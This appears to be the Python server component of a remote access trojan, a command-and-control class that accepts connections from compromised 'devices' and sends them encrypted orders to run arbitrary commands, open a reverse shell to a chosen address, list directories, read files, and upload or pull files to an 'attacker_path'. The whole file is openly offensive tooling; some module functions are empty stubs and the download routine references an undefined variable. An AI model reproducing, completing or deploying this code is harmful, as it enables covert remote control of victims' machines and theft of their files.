from globals import *
class SOCKET():
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.start(address, port)
    def revshell(self, id, address, port):
        """Open a Reverse Shell to a given Address:Port
        Args:
            id (int): Connection ID
            address (str): Receiver Address
            port (int): Receiver Port

        Returns:
            bool: True if success, False if not
            str: Message
        """  
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"SHELL:{address}:{port}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            if output == "0":
                return False, "Couldn't open a Reverse Shell"
            else:
                return True, output
    def decrypt(self, data):
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        return self.fernet.encrypt(data.encode())

    def refresh_connections(self):
        while True:
            if not threading.main_thread().is_alive():
                self.server.close()
                exit()
            for conn_i in self.connections:
                conn = conn_i[0]
                try:
                    conn.send(self.encrypt("alive:alive"))
                except:
                    self.connections.remove(conn_i)
            time.sleep(10)
    def rce(self, id, cmd):
        """Send a Cmd to a Device and return the Output
        Args:
            id (int): Connection ID
            cmd (str): Command to execute

        Returns:
            bool: True if success, False if not
            str: Output of the command
        """        
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"CMD:{cmd}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output
    def get_device_infos(self, id):
        """Get Infos about a Device
        Args:
            id (int): Connection ID
        Returns:
            bool: True if success, False if not
            str: Output of the command
        """  
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"INFOS:"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def load_module(self, id, module):
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        pass

    def execute_module(self, id, module):
        pass

    def get_directory_contents(self, id, dir):
        """Get the contents of a directory
        Args:
            id (int): Connection ID
            dir (str): Directory to get the contents of

        Returns:
            bool: True if success, False if not
            str: Files in the directory or an Error Message
        """  
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"dir:{dir}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def get_file_contents(self, id, path):
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        conn.send(self.encrypt(f"content:{path}"))
        try:
            output = self.decrypt(conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def listen(self):
        self.server.listen()
        while True:
            try:
                conn, addr = self.server.accept()
            except OSError:
                log("A new Device connected, but no new Session could be initialised.", alert="error")
            except KeyboardInterrupt:
                exit()
            else:
                self.connections.append((conn, addr))
                conn.send(self.key)
                ph_print(f"New Connection initialised from {addr}")
                logging.info(f"New Connection initialised from {addr}")

    def start(self, address, port):
        self.connections = []
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        SERVER = address
        ADDR = (SERVER, port)
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.bind(ADDR)
        except:
            log("Port is already in use.", alert="critical")
            exit()
        threading.Thread(target=self.listen).start()
        threading.Thread(target=self.refresh_connections).start()

    def stop(self):
        self.server.close()

    def file_upload(self, id, fil, path):
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
            time.sleep(1)
            conn.sendfile(f)
            status = self.decrypt(conn.recv(1024))
            if status == "0":
                raise Exception
        except:
            return False, "File could not be uploaded"
        else:
            return True, "File uploaded"

    def file_download(self, id, target_path, attacker_path):
        try:
            conn, addr = self.connections[id]
        except:
            return False, "Connection not found"
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            conn.send(self.encrypt(f"file-d:{target_path}"))
            fil = conn.recv(1024)
            if fil == "0":
                raise Exception
            with open(attacker_path, "wb") as f:
                f.write(fil)
        except:
            return False, "File not found"
        else:
            return True, "File downloaded"